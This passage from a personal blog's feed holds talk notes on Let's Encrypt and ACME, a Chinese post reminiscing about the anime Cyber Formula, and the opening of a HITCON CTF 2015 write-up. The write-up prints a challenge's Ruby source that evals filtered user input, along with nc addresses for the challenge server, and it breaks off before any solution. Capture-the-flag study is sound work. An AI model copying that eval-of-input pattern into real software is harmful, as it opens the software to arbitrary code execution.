&lt;li&gt;Perception that TLS is slow (especially for session establishment) or is very computationally intensive  &lt;/li&gt;
&lt;li&gt;Difficulty integrating into some server and data center designs (like load balancing)  &lt;/li&gt;
&lt;li&gt;Cost and effort of obtaining and managing PKI certificates  &lt;/li&gt;
&lt;li&gt;Even a skilled person who understands PKI conceptually may take ~1 hour to get and deploy a cert... and then it may expire, or omit some vhosts.  &lt;ul&gt;
&lt;li&gt;People say it's waste of my time and not worth it.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Let's Encrypt&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Initially, a collaboration among EFF, University of Michigan, and Mozilla  &lt;ul&gt;
&lt;li&gt;to create a fully automated CA to issus certificates to any site for any purpose, quickly and at no charge  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Aiming to be cheaper, easier, and more secure than existing CAs  &lt;/li&gt;
&lt;li&gt;Thanks to partners including Akamai, Cisco, and IdenTrust, we have publicly  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Cross-signing&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Root CAs can and do delegate their authority to intermediate CAs - currently hundreds of named entities  &lt;/li&gt;
&lt;li&gt;Browsers then automatically trust these intermediates; end-entity certs are almost always signed by intermediates, not roots  &lt;/li&gt;
&lt;li&gt;Our CA is now cross-signed by IdenTrust; &lt;em&gt;mainstream browsers trust us today&lt;/em&gt;;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Let's Encrypt concept&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Clien (User's Web Server), Sever (Let's Encrypt CA)  &lt;/li&gt;
&lt;li&gt;Lowest level of validation for PKIX certificates is DV (Domain Validation) - verification by the CA that the applicant controls the domain name (or a server that the domain name is pointed at)  &lt;/li&gt;
&lt;li&gt;Explicitly doesn't confirm the real-world identity of the applicant  &lt;/li&gt;
&lt;li&gt;Software on web server, and the server connect to the Let's Encrypt CA.  &lt;/li&gt;
&lt;li&gt;ACME (Automated Certificate Management Environment) to handle conversations about cert issuance  &lt;/li&gt;
&lt;li&gt;Client claims to control a particular name or names, and asks for a cert for them  &lt;/li&gt;
&lt;li&gt;Server issues one or more challenges to ask the client to prove its control (and/or possibly prove control of other cryptographic keys)  &lt;/li&gt;
&lt;li&gt;Client satisfies these challenges and server verifies this automatically then issues cert and sends it over  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Normal users: Certificates just make browsers complain the wrong domain name or expired to users while browsing the Internet. (LOL)  &lt;/p&gt;
&lt;h2&gt;ACME&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;A JSON-based protocol  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Let's Encrypt status&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Internet Security Resarch Group (ISRG)  &lt;ul&gt;
&lt;li&gt;We don't want people to know about what we are doing, so we think this name is good.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;DVFNI&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Crypto  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Convenience&lt;/h2&gt;
&lt;p&gt;We anticipate people who administer their own web servers will run something like  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo apt-get install letsencrypt  
$ sudo letsencrypt  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and the client will not only obtain, but also deploy, the new cert in less than a minute.  &lt;/p&gt;
&lt;p&gt;We're working on a client that will parse and write Apache and Nginx configs, and autorenew expiring certs.  &lt;/p&gt;
&lt;p&gt;Apache sever's config file is really hard to parse, so we made a lot of effort on it.  &lt;/p&gt;
&lt;h2&gt;Safety&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;We care a lot about avoiding misissuance and plan to adopt technologies to stop it  &lt;/li&gt;
&lt;li&gt;We are publishing all certs in Google's Certificate Transparency system  &lt;/li&gt;
&lt;li&gt;We're planning to prevent issuance for a domain that already has a valid cert unless the applicant can prove control of its subject key  &lt;/li&gt;
&lt;li&gt;We can also have mechanisms for domains to ask us never to issue for them  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can have records about all certificates we've issued, and people can also check the list. If we got hacked, we can easily see the compromised records.  &lt;/p&gt;
&lt;h2&gt;Wider integration&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;We'd like to be integrated on every server OS or web server and every hosting and application platform  &lt;/li&gt;
&lt;li&gt;The ACME protocol is in a standardization process at IETF and will be an open standard  &lt;/li&gt;
&lt;li&gt;You can use the protocol to request certs from us without using our client software.  &lt;ul&gt;
&lt;li&gt;You can even write you own client.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Contractual relationship isn't required, though we welcome new sponsors.  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Help!&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Please join the beta test program  &lt;ul&gt;
&lt;li&gt;Fill out a form with your domin names + e-mail address, then wait for e-mail confirmation  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Try out our service and report client or service bugs, and optionally send us pathces.  &lt;/li&gt;
&lt;li&gt;Beta certs are fully "real" and mainstream browsers accept them now  &lt;/li&gt;
&lt;li&gt;Integrating our client in your favorite OS or with your favorite web server  &lt;ul&gt;
&lt;li&gt;Or other server (ESMTP, IMAP, XMPP, ...)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Packaging our client  &lt;/li&gt;
&lt;li&gt;Integrating our client with your favorite hosting environment  &lt;/li&gt;
&lt;li&gt;Auditing our client or server  &lt;/li&gt;
&lt;li&gt;Writing more tests  &lt;/li&gt;
&lt;li&gt;Documenting our client (man pages, FAQ, introduction, explaining PKI, what key/cert/chain are)  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Client written in Python, Server written in Go.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;Real-world cryptography: What could possibly go wrong?&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;鄭振牟 （台大電機系副教授）  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;EasyCard 2.0&lt;/h2&gt;
&lt;h2&gt;CDC (自然人憑證) - Citizen Digital Certificate&lt;/h2&gt;
&lt;p&gt;政府：「新的自然人憑證應該安全了」 「你信嗎？」 「反正我是信了。」  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Thought&lt;/h2&gt;
&lt;p&gt;後半段鄭教授講有關悠遊卡跟自然人憑證的部份我沒有聽的很仔細，&lt;br /&gt;
大致上是在講之前悠遊卡出包後，教授的研究團隊有投入補救，然後推出悠遊卡 2.0。&lt;br /&gt;
然後自然人憑證的部份有講到超大質數在以 Hexadecimal 顯示時會有過度規律的問題等等。&lt;br /&gt;
然後提供了許多論文，給想瞭解的人去參考。&lt;br /&gt;
我也沒有記下來，畢竟這次來主要是想瞭解 EFF 的資訊。  &lt;/p&gt;
&lt;p&gt;簡單來說 Let's Encrypt 在做的事情就是讓取得憑證這件事情變得愈簡單愈好，&lt;br /&gt;
方便架站者可以很快、很方便的取得並儘量自動化設定憑證，之後便能直接使用，&lt;br /&gt;
讓架站者可以迅速地提供使用者 HTTPS 加密連線，不要使用 plaintext 的 HTTP。&lt;br /&gt;
以往因為憑證的設定需要一連串繁瑣的步驟及有些複雜的指令，讓許多架站者覺得時間成本過高，&lt;br /&gt;
而且大多數的憑證是需要購買的，Let's Encrypt 則提供免費的憑證，且只需透過簡單的指令就可以迅速設定完成。&lt;br /&gt;
總之就是希望使用者在網路上的連線資料都是加密的，而不是使用 HTTP 在網路上裸奔，容易讓有心人士取得資料。  &lt;/p&gt;
&lt;p&gt;Let's Encrypt 的官方網站： &lt;a href="https://letsencrypt.org/"&gt;Let's Encrypt&lt;/a&gt;&lt;br /&gt;
有興趣的人可以點進去瞧瞧，目前只有英文，也歡迎有興趣的人貢獻繁體中文的翻譯。&lt;br /&gt;
如果你覺得他們致力於網路安全的努力值得支持的話，也可以到官方網站的 donate 連結，小額贊助一些錢給他們。  &lt;/p&gt;
&lt;p&gt;從 2015/9/12 到目前都是 limited beta 測試中，採填表申請並等待的制度。&lt;br /&gt;
但從下禮拜 (12/3 Thu) 開始，進入 public beta 測試階段，&lt;br /&gt;
屆時系統會開放給任何想申請的人，無需等待回信。&lt;br /&gt;
詳細公告在此 &lt;a href="https://letsencrypt.org/2015/11/12/public-beta-timing.html"&gt;Public Beta: December 3, 2015&lt;/a&gt;&lt;br /&gt;
有興趣的人歡迎到時候申請來使用看看，遇到任何問題或 bug 都歡迎回報給他們。  &lt;/p&gt;
&lt;p&gt;順便附上他們的 Twitter： &lt;a href="https://twitter.com/EFF"&gt;EFF (@EFF) | Twitter&lt;/a&gt;&lt;br /&gt;
可以比較快的知道一些新資訊  &lt;/p&gt;
&lt;p&gt;最後覆蓋海報一張結束這篇文章  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Poster" src="/files/a-free-certificate-authority-to-encrypt-the-entire-web/poster.jpg" /&gt;  &lt;/p&gt;</summary><category term="Let's Encrypt"></category><category term="EFF"></category><category term="Speech"></category></entry><entry><title>童年回憶之閃電霹靂車</title><link href="https://blog.m157q.tw/posts/2015/11/24/cyber-formula-within-my-childhood-memory/" rel="alternate"></link><published>2015-11-24T01:22:22+08:00</published><updated>2015-11-24T01:22:22+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-11-24:posts/2015/11/24/cyber-formula-within-my-childhood-memory/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;&lt;img alt="GPX Cyber Formula" src="/files/cyber-formula-within-my-childhood-memory/gpx_cyber_formula.png" /&gt;&lt;br /&gt;
最近才發現小時候很愛看的動畫之一&lt;br /&gt;
&lt;strong&gt;《閃電霹靂車》(新世紀GPXサイバーフォーミュラ)&lt;/strong&gt;&lt;br /&gt;
 的時代背景設定始於西元 2015 年&lt;br /&gt;
（沒錯，就是快過完的今年。雖然至今閃電霹靂車(Cyber Formula)仍未誕生，目前也只有特斯拉汽車比較接近阿斯拉的概念?）&lt;br /&gt;
日本 ANIMAX 就藉著這個機會撥出了TV版動畫的HD版本的樣子&lt;br /&gt;
&lt;a href="http://www.animax.co.jp/program/NN10001809"&gt;http://www.animax.co.jp/program/NN10001809&lt;/a&gt;&lt;br /&gt;
（有沒有重製我不清楚，因為TV版的作畫真的很潦草，就是一個「崩」字）  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;背景&lt;/h2&gt;
&lt;p&gt;動畫製作於西元 1991 年，年紀跟我差不多，距今已約 25 年。&lt;br /&gt;
作品取材很明顯的就是來自於 F1 一級方程式賽車，但當然動畫跟現實之間還是有差距的。&lt;br /&gt;
由日昇動畫(SUNRISE)製作，該公司負責製作的動畫最著名的就屬《鋼彈》，其他還有《銀魂》、《犬夜叉》、《KERORO軍曹》、《Code Geass 反叛的魯路修》等等。（其中《閃電霹靂車》和《Code Geass 反叛的魯路修》為該公司原創劇情。）&lt;br /&gt;
對該動畫製作公司有興趣的人可以參考 &lt;a href="https://zh.wikipedia.org/wiki/%E6%97%A5%E6%98%87%E5%8B%95%E7%95%AB"&gt;日昇動畫 - 维基百科，自由的百科全书&lt;/a&gt;&lt;br /&gt;
《閃電霹靂車》的作者名為&lt;a href="https://zh.wikipedia.org/wiki/%E7%9F%A2%E7%AB%8B%E8%82%87"&gt;矢立肇&lt;/a&gt;，&lt;br /&gt;
但其實沒有這個人，這只是 SUNRISE 公司的「集合筆名」，通常是 SUNRISE 公司的原創作品才會掛上「原作：矢立肇」  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;內容&lt;/h2&gt;
&lt;p&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E9%96%83%E9%9B%BB%E9%9C%B9%E9%9D%82%E8%BB%8A"&gt;閃電霹靂車 - 维基百科，自由的百科全书&lt;/a&gt;&lt;br /&gt;
中的一段內文  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;「最初由於收視不佳與相關玩具的銷售不理想，且動畫製作極為粗糙，原來設定播放50集的TV版本在最後被縮短為37集播放。TV商業化雖然失敗，但是動畫劇情內容的評價卻不差，在1991年獲選日本多項讀者投票的動畫大獎。」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;還沒重溫前的我看到了「極為粗糙」4個字本來還不太相信&lt;br /&gt;
想說小時候看的時候覺得還好啊！&lt;br /&gt;
但重溫了之後真的發覺跟同期暢銷動畫比起來差太多。&lt;br /&gt;
無論是繪製的細膩度、上色程度都顯的非常倉促。&lt;br /&gt;
&lt;img alt="Original TV version" src="/files/cyber-formula-within-my-childhood-memory/original_tv_version.png" /&gt;  &lt;/p&gt;
&lt;p&gt;但劇情內容真的還算不錯，&lt;br /&gt;
每集的劇情都很明確且緊湊，&lt;br /&gt;
不像灌籃高手一場球賽可能要打好幾集，&lt;br /&gt;
每場比賽通常都用一集的時間解決。&lt;br /&gt;
主角風間隼人每次比賽前後的空檔中，&lt;br /&gt;
不時穿插一些和比賽比較無關的劇情，&lt;br /&gt;
也會有些激勵人心的劇情，&lt;br /&gt;
例如：主角透過約定使得醫生診斷判定雙腳已經可以站立行走卻因為沒有勇氣而選擇繼續待在輪椅上的小女孩鼓起勇氣踏出了人生的第一步。&lt;br /&gt;
撇開主角才十四歲就拿到了摩托車跟閃電霹靂車的駕照不提，&lt;br /&gt;
（感覺作者群覺得 25 年後考取駕照的門檻已經降低到 14 歲了，連 14 歲都能參加比 F1 還快的 Cyber Formula Grand Prix）  &lt;/p&gt;
&lt;p&gt;&lt;img alt="CF License 1" src="/files/cyber-formula-within-my-childhood-memory/cf_license_1.png" /&gt;&lt;br /&gt;
&lt;img alt="CF License 2" src="/files/cyber-formula-within-my-childhood-memory/cf_license_2.png" /&gt;  &lt;/p&gt;
&lt;p&gt;雖然靠著老爸風間廣之的遺世之作：阿斯拉(Asurada)，還是很像開外掛一般。&lt;br /&gt;
但劇情不全是主角威能全開那般的一帆風順，&lt;br /&gt;
初期常常因為主角正值 14 歲的中二個性導致比賽失利，&lt;br /&gt;
不聽他人意見的主角導致阿斯拉的引擎過熱爆炸輸掉比賽，&lt;br /&gt;
甚至在得知父親風間廣之為了保護新一代的人工智慧系統阿斯拉不落入軍事用途，而遭人謀殺的噩耗時，&lt;br /&gt;
主角因此精神渙散，造成阿斯拉撞毀而無法完成預賽，流露了一股人性的軟弱，&lt;br /&gt;
而不是什麼眼淚擦乾了就沒事，然後還可以拿下第1名的主角威能劇情。&lt;br /&gt;
也許就是這樣的主角反而更貼近觀眾的心吧？&lt;br /&gt;
也許就是因為這樣的劇情，才讓擁有這樣粗糙的作畫卻仍然可以獲得讀者投票的動畫大賞吧？  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;和現代的比較&lt;/h2&gt;
&lt;p&gt;而既然故事中的背景年代就是今年，當然要稍微仔細看一下動畫中出現的科技產品：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;手機：還是黑金剛那種，而不是現在的智慧型手機。  &lt;/li&gt;
&lt;li&gt;電視：已經有液晶和大平面螢幕的概念，特殊的是在第 25 話中，新條直輝在晚宴前觀看風間隼人拯救前輪艙無法順利開啟的客機的新聞畫面時的那台電視，在關閉後實際上是一幅畫。也就是說作者群當時認為未來會出現這種平常看起來像畫的平面電視吧。（我不清楚現在有沒有這種電視就是）  &lt;/li&gt;
&lt;li&gt;3.5吋磁碟片：在第 24 話出現了用來解除阿斯拉的防禦系統，好讓阿斯拉可以被轉移到新的賽車上的破解程式，程式卻是儲存在現在已經被淘汰的 3.5 吋磁碟片裡。&lt;br /&gt;
&lt;img alt="3.5 inch Floppy Disk" src="/files/cyber-formula-within-my-childhood-memory/3.5fd.png" /&gt;  &lt;/li&gt;
&lt;li&gt;阿斯拉配備的發射型衛星：直接從車上發射衛星實在是不太可能的一件事，不過現代比較接近的應該就是無人機吧，從車上發射無人機升空然後跟著車子協助探勘地形，好像比較接近。  &lt;/li&gt;
&lt;li&gt;阿斯拉：像阿斯拉這種可以跟人溝通的近乎完全的人工智慧，在現代比較接近的可能就是 iPhone 裡頭的 Siri 吧。不過 Siri 是透過網路來收集用戶大量的資料進而學習，像阿斯拉這種體積如此小且獨立的超級電腦，在現代應該還是天方夜譚？  &lt;/li&gt;
&lt;li&gt;虛擬實境：阿斯拉的賽車駕駛艙擁有在屏幕上顯示前車行進路線及模擬駕駛等等功能，包含了現代的擴增實境與虛擬實境的概念。&lt;br /&gt;
&lt;img alt="Virtual Reality" src="/files/cyber-formula-within-my-childhood-memory/vr.png" /&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;崩壞的作畫&lt;/h2&gt;
&lt;p&gt;最後附上幾張截圖讓大家知道當年TV版的作畫有多崩，我截圖的這個好像還是重製過的。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;這穿牆過彎的畫面還重複用了不只一次&lt;br /&gt;
&lt;img alt="The Car" src="/files/cyber-formula-within-my-childhood-memory/the_car.png" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;上一秒明日香在電視上看到的畫面跟下一秒實際的畫面顏色完全相反、道路跟黃土也相反，甚至連車子的顏色也相反，車型也長的不一樣，真不曉得當時是經費太少還是製作組太混XD&lt;br /&gt;
&lt;img alt="Opposite Color 1" src="/files/cyber-formula-within-my-childhood-memory/opposite_color_1.png" /&gt;&lt;br /&gt;
&lt;img alt="Opposite Color 2" src="/files/cyber-formula-within-my-childhood-memory/opposite_color_2.png" /&gt;  &lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;經典 OP &amp;amp; ED&lt;/h2&gt;
&lt;p&gt;差點忘了聽過絕對不會忘記的經典 OP 和 ED，曾經看過的人聽到應該都會起雞皮疙瘩吧？  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;OP: &lt;a href="https://www.youtube.com/watch?v=HXcBHUQhPKI"&gt;Future GPX Cyber Formula _新世紀GPX閃電霹靂車_TV版OST主題曲OP_I'll Come MV - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;內有 MV，可以看到當初非常潦草的作畫XD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ED: &lt;a href="https://www.youtube.com/watch?v=R52lQXLoHo8"&gt;閃電霹靂車(ED1)-Winners(中日字幕)(FULL) - YouTube&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一樣有 MV，開頭那段電子音樂出來我就起雞皮疙瘩了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;傳送門&lt;/h2&gt;
&lt;p&gt;最後的最後，給也想重溫的人：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLRPZTUPjwo5YnyZlDrLOUn8U6iIyy1l20"&gt;《新世紀GPX 閃電霹靂車》TV版 第一部（全37話）&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;重製過的版本，顏色的明亮跟對比還有線條都增加了許多。  &lt;/li&gt;
&lt;li&gt;繁中字幕  &lt;/li&gt;
&lt;li&gt;我重看的就是這個版本，即便是重製過的，以現在的眼光看來，仍舊讓人覺得作畫很粗糙。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.youtube.com/playlist?list=PLiDy-ZkVzVfda_TXVIAHuXvAMjl7hvt3B"&gt;閃電霹靂車一.二.三.四.五部 &lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;這個是原始的版本的樣子  &lt;/li&gt;
&lt;li&gt;有興趣的人可以跟上面那個比較一下，就知道原始TV版的作畫到底有多恐怖了。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;一起回味童年吧！  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E9%96%83%E9%9B%BB%E9%9C%B9%E9%9D%82%E8%BB%8A"&gt;閃電霹靂車 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E6%97%A5%E6%98%87%E5%8B%95%E7%95%AB"&gt;日昇動畫 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/%E7%9F%A2%E7%AB%8B%E8%82%87"&gt;矢立肇 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://zh.wikipedia.org/wiki/Code_Geass%E5%8F%8D%E5%8F%9B%E7%9A%84%E9%AD%AF%E8%B7%AF%E4%BF%AE"&gt;Code Geass反叛的魯路修 - 维基百科，自由的百科全书&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.ptt.cc/bbs/CyberFormula/M.1444734993.A.C6E.html"&gt;Fw: [閒聊] 談一談閃電霹靂車的取材 - 看板 CyberFormula - 批踢踢實業坊&lt;/a&gt;  &lt;ul&gt;
&lt;li&gt;一小篇蠻有趣的取材介紹  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="Cyber Formula"></category><category term="Anime"></category><category term="TV"></category></entry><entry><title>HITCON CTF 2015 Quals Write-up</title><link href="https://blog.m157q.tw/posts/2015/10/19/hitcon-ctf-2015-quals-write-up/" rel="alternate"></link><published>2015-10-19T11:42:55+08:00</published><updated>2015-10-19T11:42:55+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2015-10-19:posts/2015/10/19/hitcon-ctf-2015-quals-write-up/</id><summary type="html">&lt;h2&gt;MISC - Flag not Found [1]&lt;/h2&gt;
&lt;p&gt;Any &lt;code&gt;404 Nout Found&lt;/code&gt; page on &lt;a href="https://ctf2015.hitcon.org"&gt;https://ctf2015.hitcon.org&lt;/a&gt; will print out the flag.  &lt;/p&gt;
&lt;p&gt;&lt;img alt="Flag not Found" src="/files/hitcon-ctf-2015-quals-write-up/flag-not-found.png" /&gt;  &lt;/p&gt;
&lt;p&gt;The flag is &lt;code&gt;hitcon{do_you_wanna_play_a_game?enjoy_hitcon_ctf_2015_quals:)}&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;MISC - hard to say [50*4]&lt;/h2&gt;
&lt;p&gt;A description  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Ruby on Fails.  
FLAG1: nc 54.199.215.185 9001  
FLAG2: nc 54.199.215.185 9002  
FLAG3: nc 54.199.215.185 9003  
FLAG4: nc 54.199.215.185 9004  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;with a Ruby source code &lt;code&gt;hard_to_say-151ba63da9ef7f11bcbba93657805f85.rb&lt;/code&gt;  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env ruby  &lt;/span&gt;

&lt;span class="nb"&gt;fail&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;flag?&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;file?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;flag&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

&lt;span class="vg"&gt;$stdout&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sync&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kp"&gt;true&lt;/span&gt;  

&lt;span class="n"&gt;limit&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;ARGV&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;].&lt;/span&gt;&lt;span class="n"&gt;to_i&lt;/span&gt;  
&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hi, I can say &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;limit&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; bytes :P&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="vg"&gt;$stdin&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;gets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip!&lt;/span&gt;  

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;limit&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="sr"&gt;/[[:alnum:]]/&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;  
  &lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;oh... I cannot say this, maybe it is too long or too weird :(&amp;#39;&lt;/span&gt;  
  &lt;span class="nb"&gt;exit&lt;/span&gt;  
&lt;span class="k"&gt;end&lt;/span&gt;  

&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;I think size = &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; is ok to me.&amp;quot;&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;s&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;to_s&lt;/span&gt;  
&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="o"&gt;..-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;...&amp;#39;&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;size&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;64&lt;/span&gt;  
&lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can see that:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The program will accept an input.  &lt;/li&gt;
&lt;li&gt;There's a flag at &lt;code&gt;./flag&lt;/code&gt;.  &lt;/li&gt;
&lt;li&gt;There's a input length limit which has been assigned as argv[0] since the program started.  &lt;ul&gt;
&lt;li&gt;For flag 1 ~ 4, the input length limit are 1024/64/36/10 bytes.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;You cannot have alphabets and numbers in the input.  &lt;/li&gt;
&lt;li&gt;If your input pass the length and non-alnum test, it will be the argument of &lt;code&gt;eval()&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;The program print out the result of &lt;code&gt;eval(input)&lt;/code&gt;  &lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Flag1 (1024 bytes)&lt;/h3&gt;
&lt;p&gt;At first, I have no idea about how to write a non-alnum Ruby code, I even don't  write Ruby.&lt;br /&gt;
Until one of my teammates gave a link &lt;a href="http://threeifbywhiskey.github.io/2014/03/05/non-alphanumeric-ruby-for-fun-and-not-much-else/"&gt;Non-Alphanumeric Ruby for Fun and Not Much Else&lt;/a&gt;.&lt;br /&gt;
After some discussions, try-and-error and with this link &lt;a href="http://stackoverflow.com/questions/2232/calling-shell-commands-from-ruby"&gt;Calling shell commands from Ruby - Stack Overflow&lt;/a&gt;,&lt;br /&gt;
we came up with &lt;code&gt;226 bytes&lt;/code&gt; solution for flag1.  &lt;/p&gt;
